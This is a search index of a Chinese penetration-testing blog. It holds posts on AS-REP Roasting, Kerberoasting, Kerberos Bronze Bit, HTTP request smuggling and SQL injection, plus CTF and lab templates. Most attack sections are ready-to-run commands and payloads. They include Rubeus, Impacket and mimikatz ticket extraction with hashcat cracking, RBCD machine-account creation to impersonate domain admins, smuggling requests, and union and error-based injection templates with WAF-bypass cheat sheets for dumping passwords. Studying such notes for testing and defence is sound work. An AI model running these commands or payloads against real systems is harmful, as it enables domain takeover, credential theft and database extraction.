<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>攻击方式 - AS-REP Roasting</title>
    <url>/2026/08/14/as-rep-roasting/</url>
    <content><![CDATA[定义：AS-REPRoasting是一种针对启用”不要要求Kerberos预认证”选项的域用户的离线密码攻击
攻击条件：
Kerberos预身份认证关闭
不需要域管理员权限，普通域用户甚至匿名即可枚举  
已知目标账户的用户名 
攻击者网络可达域控（KDC），能与 88 端口通信

实战场景：在域环境里，拿到普通访问权限后，找”不需要预认证”的账号，请求票据并离线爆破密码。  
AS-REP Roasting 攻击的目标是「用户账户」，不是「机器」  
攻击过程：获取hash（获取AS-REP响应包中用户hash加密的Login Session Key）
工具1：RubeusRubeus.exe asreproast /format:john /outfile:hash.txt //域内机器版（已加域，当前用户有权限）Rubeus.exe asreproast /domain:域名 /dc:域控IP /user:用户名 /password:密码 /format:john /outfile:hash.txt         //远程攻击

将提取到的hash保存为hash.txt
工具2：ASREPRoast.ps1脚本 (域内PowerShell)Import-Module .\ASREPRoast.ps1Invoke-ASREPRoast | select -ExpandProperty Hash | Out-File hash.txt

Adfind+GetNPUsers.py—拿到的是非域内机器前提：有一个有效的域账户和密码
用Adfind查询域内查询Kerberos预身份认证关闭的用户
adfind -h 域控IP -u 域名\用户名 -up 密码 -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:=4194304&quot; samaccountname

上一步过滤出来的域账户写入user.txt文件（或者直接用用户名本爆破）
查到这些用户名后，用 Impacket 的 GetNPUsers.py 直接拿 Hash  （在kali）
python GetNPUsers.py 域名/ -usersfile users.txt -format hashcat -outputfile hash.txt

或者单用户名
python GetNPUsers.py 域名/用户名:密码 -request -format john -outputfile hash.txt

爆破hash 默认导出都是hashcat格式，除非手动改 &#x2F; 加 /format:john
john爆破：# 最常用：rockyou 字典爆破john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt# 查看已破解的结果john --show hash.txt

hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt




 AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>AS-REP Roasting</tag>
        <tag>Kerberos</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 请求走私</title>
    <url>/2026/08/14/http-request-smuggling/</url>
    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
Content-Length头
POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling

Transfer-Encoding头
POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0

常见的HTTP请求走私类型

CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。

入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
1. 反向代理 &#x2F; 负载均衡器
Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上

2. CDN &#x2F; WAF 后端
CDN 节点与源站服务器之间
WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测

3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件

4. 常见可利用的页面&#x2F;接口
登录接口、用户认证页面（可走私出其他用户的会话）
搜索、评论等反射型输入点（可配合 XSS 扩大危害）
静态资源缓存节点（可实施缓存投毒）


利用思路:基本原理回顾
攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求

POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 

TE-CL 漏洞（前端用TE，后端用CL）
思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
利用：走私的请求前缀会污染下一个请求，影响其他用户

POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10

TE-TE 漏洞（两端都用TE，但可混淆）
思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
常见混淆手法：
Transfer-Encoding: xchunked（加前缀）
Transfer-Encoding : chunked（冒号后多空格）
Transfer-Encoding: chunked, identity（多值）
重复的 Transfer-Encoding 头
大小写变体：transfer-encoding、TRANSFER-ENCODING



进阶利用场景


利用场景
说明



绕过访问控制
走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）


缓存投毒
将恶意响应写入缓存，影响所有访问该缓存的用户


会话劫持
通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token


XSS 升级
将反射型 XSS 转化为存储型&#x2F;扩散型危害


凭据窃取
走私请求诱导后端将下一个用户的请求内容返回给攻击者



代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：

有的服务器优先使用 Content-Length
有的服务器优先使用 Transfer-Encoding
有的服务器在两者共存时报错，有的则静默选择其中一个

2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较

3. 前后端使用不同的 HTTP 解析库
前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
不同语言、不同库对 HTTP 规范的实现细节存在差异
特别是对模糊边界情况（重复头、空格、大小写）的处理不一致

4. 代理层未正确规范化请求头
代理服务器在转发请求前，没有移除或规范化歧义的请求头
安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求

5. Chunked 编码边界处理缺陷
对 chunk size 的解析不严格（允许前导零、空白字符）
对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
chunk 扩展字段（chunk extensions）处理逻辑存在漏洞

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>HTTP请求走私</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击方式 - Kerberoasting</title>
    <url>/2026/08/14/kerberoasting/</url>
    <content><![CDATA[定义：攻击者通过正常域用户密码认证获取 TGT，利用该 TGT 请求指定 SPN 的 ST 时指定 易破解的 RC4_HMAC_MD5 加密类型。若 TGT 有效，KDC 会用注册该 SPN 的账户 Hash 加密 ST 返回，攻击者提取后可离线爆破出该账户明文密码，如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域。
攻击条件：
攻击者拥有一个有效的域用户账户和密码（能正常申请 TGT）
目标服务账户在 AD 中注册了 SPN（Service Principal Name）
攻击者网络可达域控（KDC），能与 88 端口通信
服务账户密码强度较弱（可被字典爆破）
不需要管理员权限，普通域用户即可请求任意 SPN 的 ST

实战场景：在域环境里，拿到普通域用户权限后，找注册了 SPN 的服务账户，请求其 TGS 服务票据并离线爆破密码。
攻击过程：查询域内注册于域用户下的SPN工具1：RiskySPNRiskySPN是一个PowerShell脚本的集合，专检测与SPN相关的账户是否滥用，自动识别弱密码服务票据
# 1. 导入模块Import-Module .\RiskySPN.psm1# 2. 查询域内所有注册了 SPN 的用户账户Get-RiskySPN# 3. 自动识别弱密码服务票据（核心功能）Find-PotentiallyCrackableAccounts# 4. 请求指定 SPN 的 TGS 票据并导出 hash（hashcat 格式）Get-TGSCipher -SPN &quot;MSSQLSVC/server01.域名.com&quot; -Format hashcat# 5. 批量一键操作：查找 + 请求 + 导出所有可破解账户的 hashFind-PotentiallyCrackableAccounts | Get-TGSCipher -Format hashcat

工具2：PowerView.ps1# 1. 导入 PowerView 模块Import-Module .\PowerView.ps1# 2. 查询所有注册了 SPN 的用户账户（最常用）Get-NetUser -SPN | select samaccountname, serviceprincipalname# 3. 新版 PowerView 命令（Dev 分支）Get-DomainUser -SPN | select samaccountname, serviceprincipalname

请求指定SPN的STRuberus# 请求指定 SPN 的 ST + 导出 hashRubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt# 批量请求所有 SPNRubeus.exe kerberoast /outfile:hash.txt

mimikatz# 请求指定 SPN 的 STkerberos::ask /target:服务名/主机名.域名.com# 导出所有票据kerberos::list /export

GetUserSPNs.py# 请求指定 SPN 的 ST + 导出 hashpython GetUserSPNs.py 域名/用户名:密码 -request -spn 服务名/主机名.域名.com -outputfile hash.txt# 批量请求所有 SPNpython GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt

导出请求的ST查看内存中的票据用cmd:
Klist

导出内存中的票据mimikatz：（在mimikatz同目录下直接导出.kirbi文件）
kerberos::list /export

补充：从 LSASS 内存中提取（mimikatz 另一种方式）
# 从LSASS进程内存中提取所有Kerberos票据sekurlsa::kerberos /export


这种方式需要管理员权限，能拿到所有登录用户的票据，包括别人的

Rubeus  ：# 导出所有 Kerberos 票据（包括 ST）为 .kirbi 文件Rubeus.exe dump /outfile:tickets

GetUserSPNs.py# 直接导出 hashcat 格式，不用 kirbi 中转python GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt

离线爆破ST格式转换（kirbi → hashcat ）用 Rubeus 转换Rubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt

用hashcat爆破用Rubeus或GetUserSPNs.py导出的hash.txt用以下命令：
hashcat -m 13100 hash.txt rockyou.txt

用 tgsrepcrack.py脚本 对mimikatz导出的.kirbi票据进行爆破：
python tgsrepcrack.py rockyou.txt ticket.kirbi




 AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
        <tag>域渗透</tag>
        <tag>Kerberoasting</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Writeup 写作模板</title>
    <url>/2026/08/14/ctf-writeup-template/</url>
    <content><![CDATA[
这是一篇示例文章，展示 Writeup 的推荐写法。写完自己的 Writeup 后可以删除本文。

一、题目信息


项目
内容



赛事
某某 CTF 2026


题目
题目名称


类型
Web &#x2F; Pwn &#x2F; Crypto &#x2F; Misc &#x2F; Reverse


分值
500


难度
⭐⭐⭐


二、题目描述把题目描述和附件下载链接贴在这里。
三、解题过程3.1 信息收集打开题目，观察页面，抓包分析：
curl -s http://target.com/ | head -20

3.2 漏洞分析发现漏洞点，说明原理：
import requestsr = requests.get(&#x27;http://target.com/flag.php&#x27;)print(r.text)

3.3 漏洞利用给出完整的利用脚本（POC &#x2F; EXP）：
python3 exp.py


注意：关键 payload 记得用代码块包裹，方便读者复制。

四、获取 Flagflag&#123;this_is_an_example_flag&#125;

五、总结
考察的知识点
踩过的坑
相关参考链接

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>模板</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击方式 - Kerberos Bronze Bit</title>
    <url>/2026/08/14/kerberos-bronze-bit/</url>
    <content><![CDATA[定义:
Kerberos Bronze Bit攻击（CVE-2020-17049）是针对Kerberos协议中约束委派与基于资源的约束委派（RBCD）的一种安全功能绕过漏洞。它允许攻击者篡改服务票据（ST）的Forwardable标志位，从而突破”敏感账户禁止被委派”等安全限制。
核心原理：

在Kerberos约束委派中，如果目标用户被标记为”不能被委派”或属于Protected Users组，KDC会签发不可转发的ST（Forwardable&#x3D;0），阻止S4U2Proxy获取其他服务票据。 
漏洞在于：ST是用服务密钥加密的，Forwardable标志位不在PAC中，服务端可自行解密ST、修改该标志为1，再重新加密并提交给KDC。由于KDC无法检测该位是否被篡改，攻击者即可绕过限制，继续发起S4U2Proxy请求获取任意服务的ST。
攻击条件：
拥有服务账户的密码哈希  

该服务配置了 约束委派 &#x2F; RBCD委派



 服务账户哈希的获取方式：Kerberoasting、DCSync、创建机器账户（Powermad）等。  

实战场景：场景 1：绕过 “敏感账户不能被委派”

目标：拿下域管账号，但域管属于 Protected Users 组，不能被委派
利用：Bronze Bit 修改 Forwardable 标志位，绕过限制
结果：可以冒充域管访问目标服务

场景 2：绕过 “仅使用 Kerberos” 限制

配置：服务被设置为 “仅使用 Kerberos”（没有 TrustedToAuthForDelegation 权限）
正常：无法使用协议转换（S4U2Self + S4U2Proxy）
利用：Bronze Bit 可以绕过这个限制，实现协议转换

场景 3：RBCD 场景下绕过敏感账户限制

配置：有 RBCD 权限，但目标用户是敏感账户不能被委派
利用：Bronze Bit 修改标志位，绕过限制

攻击过程：约束性委派攻击绕过工具1： Rubeus（最常用）# 完整的 Bronze Bit 攻击命令Rubeus.exe s4u /user:服务账户 /rc4:服务账户NTLM哈希 /domain:域名 /dc:域控IP /impersonateuser:要冒充的用户 /msdsspn:目标服务SPN /bronzebit /ptt# 注入票据后直接访问共享dir \\fileserver.test.com\c$

目标服务SPN：服务类型/主机名:端口SPN（Service Principal Name，服务主体名称） &#x3D; 服务在 Kerberos 里的 “身份证”。
简单说：你要访问哪个服务，就要用哪个服务的 SPN 去申请票据。



服务
SPN 示例
用途



CIFS
cifs/fileserver.test.com
文件共享、SMB


HTTP
http/web.test.com
Web 服务


MSSQL
MSSQLSvc/sql.test.com:1433
SQL Server


LDAP
ldap/dc01.test.com
域控 LDAP


HOST
host/pc01.test.com
主机服务（WMI、WinRM 等）


RPCSS
rpcss/dc01.test.com
RPC 服务


WSMAN
WSMAN/pc01.test.com
WinRM &#x2F; PowerShell 远程


怎么拿目标服务的 SPN？方法 1：setspn（系统自带，最简单）
cmd:
:: 查指定主机的所有 SPNsetspn -L 主机名:: 查整个域的所有 SPNsetspn -Q */*

方法 2：PowerView（最常用）
# 查指定主机的 SPNGet-DomainComputer -Identity 主机名 -Properties serviceprincipalname# 查所有有 SPN 的账户（Kerberoasting 用）Get-DomainUser -SPNGet-DomainComputer -SPN

方法 3：Rubeus（域渗透神器）
# 查所有用户的 SPNRubeus.exe kerberoast /stats# 查指定用户的 SPNRubeus.exe kerberoast /user:用户名

方法 4：BloodHound
直接在图里点目标机器，看 Owned 属性里的 serviceprincipalname。
工具2：getST.py加 -force-forwardable参数python3 getST.py -force-forwardable -spn 目标服务SPN -impersonate 要冒充的用户 域名/服务账户:密码 -dc-ip 域控IP# 设置票据环境变量export KRB5CCNAME=administrator.ccache# 用票据访问目标服务例：smbclient //fileserver.test.com/c$ -k -no-pass

基于资源的约束性委派攻击（RBCD）绕过工具1：Rubeus# 创建机器账户 + 配置 RBCD + Bronze Bit 一把梭# 前提：已经有修改目标机器属性的权限# 第1步：创建机器账户（Powermad）New-MachineAccount -MachineAccount &quot;EvilPC$&quot; -Password $(ConvertTo-SecureString &quot;Pass123!&quot; -AsPlainText -Force)# 第2步：配置 RBCD（把机器账户加到目标机器的允许委派列表）Set-DomainRBCD -Identity &quot;TargetPC$&quot; -AllowedIdentity &quot;EvilPC$&quot;# 第3步：Bronze Bit 攻击，冒充域管拿目标机器的 CIFS 票据Rubeus.exe s4u /user:服务账户 /rc4:服务账户NTLM哈希 /domain:域名 /dc:域控IP /impersonateuser:要冒充的用户 /msdsspn:目标服务SPN /bronzebit /ptt

工具2：getST.py+rbcd.py+addcomputer.py# 第1步：创建机器账户（用 impacket 的 addcomputer.py）python3 addcomputer.py test.com/普通用户:密码 -computer-name EvilPC -computer-pass Pass123! -dc-ip 10.0.0.1# 第2步：配置 RBCD（用 rbcd.py）python3 rbcd.py test.com/普通用户:密码 -f EvilPC$ -t TargetPC$ -dc-ip 10.0.0.1# 第3步：Bronze Bit 攻击python3 getST.py -force-forwardable -spn 目标服务SPN -impersonate 要冒充的用户 域名/服务账户:密码 -dc-ip 域控IP或者：python3 getST.py -force-forwardable -spn cifs/targetpc.test.com -impersonate administrator -hashes :机器账户NTLM哈希 test.com/EvilPC$ -dc-ip 10.0.0.1


正常 RBCD vs Bronze Bit 绕过


对比项
正常 RBCD
RBCD + Bronze Bit



能冒充普通用户
✅ 可以
✅ 可以


能冒充敏感账户
❌ 不行
✅ 可以


能冒充 Protected Users
❌ 不行
✅ 可以


能冒充域管
❌ 不行（域管默认敏感）
✅ 可以


需要的权限
修改目标机器 RBCD 属性
一样


需要的额外东西
无
机器账户的哈希（本来就有）


]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
        <tag>域渗透</tag>
        <tag>Bronze Bit</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场笔记写作模板</title>
    <url>/2026/08/14/lab-notes-template/</url>
    <content><![CDATA[
这是一篇示例文章，展示靶场笔记的推荐写法。

靶场信息


项目
内容



靶场名称
DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB


目标地址
http://xxx


难度
低 &#x2F; 中 &#x2F; 高


授权范围
本地练习 &#x2F; 官方授权


环境搭建docker run -d -p 80:80 vulnerables/web-dvwa

漏洞点分析描述漏洞成因与触发条件。
利用过程步骤一：xxxsqlmap -u &quot;http://target/?id=1&quot; --dbs

步骤二：xxx插入截图（图片放在与文章同名的资源文件夹中）：
&#123;% asset_img 1.png 截图描述 %&#125;

防御与修复
过滤输入
使用参数化查询
最小权限原则

]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>模板</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 注入的原理及测试</title>
    <url>/2026/08/14/sql-injection-principles/</url>
    <content><![CDATA[SQL 注入原理：SQL 注入的本质是代码与数据未分离。当用户可控的输入被直接拼接到 SQL 语句中执行时，攻击者可以通过构造恶意输入改变原有 SQL 的逻辑，从而执行非预期的数据库操作。
产生条件有两个：

用户可控：输入参数用户可以控制
拼接执行：输入被直接拼接到 SQL 语句中并执行

SQL注入的检测与攻击技术：检测思路：
先寻找注入点 → 判断字段数 → 逐步查询数据库名、表名、列名，最终获取敏感数据。
常见攻击类型：



中文名
原理
利用条件



联合查询注入
利用 union 联合查询拼接结果
页面有回显位


报错注入
利用数据库函数的报错信息回显数据
页面显示数据库报错


布尔盲注
基于页面真假变化逐位猜解数据
页面有布尔状态变化


时间盲注
利用 sleep 等函数的执行时间差猜解
页面无任何回显


堆叠注入
堆叠执行多条 SQL 语句
后端支持多语句执行


SQL注入的防御方法：
预编译（参数化查询）：最有效的防御手段，使用 ? 占位符绑定变量，攻击者无法改变 SQL 结构。
使用存储过程：将 SQL 逻辑封装在存储过程中，但存储过程内部如果拼接字符串仍可能存在注入。
检查数据类型：对输入做严格的类型校验，比如数字型参数强制转 int。
使用安全函数：利用数据库厂商提供的转义函数或 ORM 框架，增强安全性。
WAF 防护：部署 Web 应用防火墙，拦截常见的注入 payload。

预编译为什么能防注入？预编译是先把 SQL 语句结构发送给数据库编译好，再把参数传进去。参数永远只是 “数据”，不会被当成 “代码” 解析，所以攻击者无法改变 SQL 逻辑。
但预编译不是万能的：如果 SQL 语句本身是动态拼接的（比如表名、列名、ORDER BY 字段），预编译就防不住，这些位置必须用白名单校验。
SQL 注入：1. 找注入点加 &#39; → 报错&#x2F;页面变化 &#x3D; 有注入
2. 测闭合


测试语句
正常
报错
结论



1&#39;
-
✅
有单引号闭合


1&quot;
-
✅
有双引号闭合


1&#39;)
-
✅
有括号 + 单引号


1&#39;))
-
✅
两层括号 + 单引号


1&#39; and &#39;1&#39;=&#39;1
✅
-
单引号闭合


1&quot; and &quot;1&quot;=&quot;1
✅
-
双引号闭合


1&#39;) and (&#39;1&#39;=&#39;1
✅
-
括号 + 单引号


3. 判类型


注入类型
判断方法
测试语句



数字型
and 1=1 正常 + and 1=2异常
1 and 1=2--+


字符型
加 &#39;报错 + &#39; and &#39;1&#39;=&#39;1正常
1&#39; and &#39;1&#39;=&#39;1--+


搜索型
加 %&#39;闭合测试
1%&#39; and 1=1 and &#39;%&#39;=&#39;


排序注入
排序参数 + desc/asc有变化
?sort=id desc &#x2F; ?sort=id asc


LIMIT 注入
分页参数 + 报错注入测试
?page=1 and 1=2--+


IN 注入
多选 &#x2F; 批量参数 + 闭合括号
?ids=1) and 1=2--+


INSERT 注入
注册 &#x2F; 新增功能 + 报错注入
username=1&#39; and sleep(5)#


UPDATE 注入
修改资料功能 + 报错注入
nickname=1&#39; and sleep(5)#


Cookie 注入
改 Cookie 值加 &#39;报错
Cookie: id=1&#39;


Header 注入
改 UA&#x2F;XFF&#x2F;Referer 加 &#39;
User-Agent: &#39; and sleep(5)#


堆叠注入
加分号 + sleep 测试
1;sleep(5)--+


宽字节注入
%df&#39;测试 + addslashes 特征
1%df&#39; and 1=2--+


二次注入
注册带注入的账号 + 登录触发
注册 admin&#39;#，再登录


3. 测 WAF逐个试关键字：and or union select &#39; # 空格 order by sleep
被拦了就试：

空格 → /**/ %0a
关键字 → 双写 anandd、大小写 SeLeCt
单引号 → 宽字节 %df&#39;

4. 判列数


方法
适用场景
测试语句



order by 法
最常用
1&#39; order by 10--+ 报错就减半，直到找到边界


group by 法
order by 被过滤
1&#39; group by 10--+同上，二分法找边界


union select 法
union 能用
1&#39; union select 1,2,3--+不报错就是对的


报错注入法
有报错回显
1&#39; and 1=2 union select * from (select 1)a join (select 2)b--+看报错信息


盲注法
啥都没有
1&#39; and (select * from flag)=1--+看列数报错信息


5. 选姿势


情况
用什么



有回显
联合注入


有报错
报错注入


有真假变化
布尔盲注


啥都没有
时间盲注


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 注入类型</title>
    <url>/2026/08/14/sql-injection-types/</url>
    <content><![CDATA[1. 数字型注入原理：参数为数字直接拼 SQL，无引号包裹，输入 &#39; 直接报错。
代码特征：参数直接拼接，无任何引号包裹。
$sql = &quot;SELECT * FROM users WHERE id = &quot;.$_GET[&#x27;id&#x27;];

危险函数：
mysqli_query($conn, $sql)    // MySQLi 过程化$pdo-&gt;query($sql)            // PDOmysql_query($sql)            // 老版本 MySQL 扩展


注入模板-- ① 判断列数?id=1 order by 3--+-- ② 判断回显位?id=-1 union select 1,2,3--+-- ③ 查库名?id=-1 union select 1,database(),3--+-- ④ 查表名?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+?id=-1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1--+-- ⑥ 拿数据?id=-1 union select 1,group_concat(username,0x3a,password),3 from 表名--+?id=-1 union select 1,concat(username,0x3a,password),3 from 表名 limit 0,1--+-- ⑦ 显示不全（substr 分段读，每段32位）?id=-1 union select 1,substr(group_concat(flag),1,32),3 from flag--+?id=-1 union select 1,substr(group_concat(flag),33,32),3 from flag--+


过滤绕过速查


过滤
绕过
示例



空格
/**/ %09 %0a 括号
?id=1/**/union/**/select/**/1,2,3--+


union select
双写、内联注释、换行
?id=1 ununionion seselectlect 1,2,3--+


and &#x2F; or
&amp;&amp;、 双写
?id=1 &amp;&amp; 1=1 ?id=1 anAndd 1=1


单引号
十六进制字符串
table_name=0x7573657273


等号 &#x3D;
like regexp &gt; &lt;
?id=1 and 1 like 1--+


注释 # –
;%00 闭合后引号
?id=1 union select 1,2,3;%00


逗号 ,
from x for y join
substr((select database())from 1 for 1)


sleep
benchmark()
and benchmark(10000000,md5(1))--+


information_schema
sys.schema_auto_increment_columns
select table_name from sys.schema_auto_increment_columns


order by
group by
?id=1 group by 3--+



2. 字符型注入原理：参数用单&#x2F;双引号包裹，需闭合引号再注入。
代码特征：参数被单引号或双引号包裹。
$sql = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$_GET[&#x27;user&#x27;]&#125;&#x27;&quot;;$sql = &quot;select passwd from user where username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;

危险函数：
mysqli_query($conn, $sql)$pdo-&gt;query($sql)


注入模板-- ① 判断列数?user=admin&#x27; order by 3--+-- ② 判断回显位?user=admin&#x27; and 1=2 union select 1,2,3--+-- ③ 查库名?user=admin&#x27; and 1=2 union select 1,database(),3--+-- ④ 查表名?user=admin&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?user=admin&#x27; and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?user=admin&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑥ 拿数据?user=admin&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑦ 显示不全?user=admin&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+


过滤绕过速查


过滤
绕过
示例



单引号
宽字节 %df&#39; 十六进制
?id=1%df&#39; union select 1,2,3--+


addslashes()
宽字节、二次注入
%df&#39; 吃反斜杠


双引号
先闭合双引号
?user=admin&quot; and 1=2 union select 1,2,3--+


空格&#x2F;关键字
同数字型
双写、大小写、注释



3. 搜索型注入（LIKE）原理：用户输入拼入 LIKE &#39;%...%&#39;，开发以为有 % 包裹就安全。
代码特征：参数在 &#39;%...%&#39; 中间。
$sql = &quot;SELECT * FROM users WHERE name LIKE &#x27;%&#123;$_GET[&#x27;kw&#x27;]&#125;%&#x27;&quot;;

危险函数：
mysqli_query($conn, $sql)


注入模板-- ① 闭合测试?kw=%&#x27; and 1=1--+?kw=%&#x27; and 1=2--+-- ② 查库名?kw=%&#x27; and 1=2 union select 1,database(),3--+-- ③ 查表名?kw=%&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?kw=%&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?kw=%&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?kw=%&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+


过滤绕过速查


过滤
绕过
说明



单引号
宽字节 %df%25&#39;
% 也要考虑编码


百分号 %
_ 匹配单字符
LIKE &#39;_dmin&#39;


空格&#x2F;关键字
同字符型
双写、大小写



4. 排序注入（ORDER BY）原理：ORDER BY 后字段名用户可控，无法预编译，开发直接拼接。重灾区。
代码特征：参数在 ORDER BY 后面，通常是排序字段或排序方式。
$sql = &quot;SELECT * FROM users ORDER BY &#123;$_GET[&#x27;sort&#x27;]&#125;&quot;;

危险函数：
mysqli_query($conn, $sql)


注入模板-- ===== 报错注入（首选） =====-- 查库名?sort=updatexml(1,concat(0x7e,database(),0x7e),1)-- 查表名?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- 查列名?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)-- 拿数据?sort=updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)-- 显示不全?sort=updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)-- ===== 布尔盲注（无报错时用） =====-- 库名长度?sort=if(length(database())=8,id,username)-- 逐字猜库名?sort=if(ascii(substr(database(),1,1))=115,id,username)-- ===== 时间盲注 =====?sort=if(1=1,sleep(5),id)


过滤绕过速查


过滤
绕过
示例



逗号 ,
from x for y
substr((select database())from 1 for 1)


if()
case when ... then ... end
?sort=case when 1=1 then id else username end


sleep
benchmark()
?sort=if(1=1,benchmark(10000000,md5(1)),id)


updatexml
extractvalue() floor()
?sort=extractvalue(1,concat(0x7e,database()))


空格
/**/ 括号
注释代替空格



5. LIMIT 注入原理：LIMIT 后偏移量&#x2F;数量用户可控，直接拼接。
代码特征：参数在 LIMIT 后面，常见于分页。
$sql = &quot;SELECT * FROM users LIMIT &#123;$_GET[&#x27;page&#x27;]&#125;,10&quot;;

危险函数：
mysqli_query($conn, $sql)


